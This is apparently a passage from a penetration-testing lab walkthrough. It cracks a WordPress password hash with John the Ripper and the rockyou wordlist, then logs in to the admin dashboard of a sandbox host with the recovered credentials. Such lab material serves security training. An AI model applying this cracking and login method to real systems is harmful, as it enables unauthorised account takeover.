We won't start with a brute force. We will use a wordlist. 

***
If you haven’t already done so, you can expand the archive by decompressing the
/usr/share/wordlists/rockyou.txt.gz file with gunzip. This will replace the archive
file with a plain text file.
***

Add hash to a txt file:
`echo '$P$BfBIi66MsPQgzmvYsUzwjc5vSx9L6i/' > pass.txt`

Crack with JtR:
`john --wordlist=/usr/share/wordlists/rockyou.txt
pass.txt`
```
...
!love29jan2006! (?)
1g 0:00:22:59 DONE 0.000724g/s 10391p/s 10391c/s 10391C/s !lovegod..!lov3h!m
Use "--show --format=phpass" to display all of the cracked passwords reliably
Session completed
```

This may take a long time depending on CPU.

Findings:
- !love29jan2006!

Let's attempt to login. Default WP login page is **/wp-admin**, so visit:
`http://sandbox.local/wp-admin`

We are redirected to a login page. Use the creds:
wp-ajla-admin:!love29jan2006!

***
It is possible that you might get a request to verify the admin email. If this is the
case, you can just click “This email is correct” to continue.
***

We get the admin dashboard.


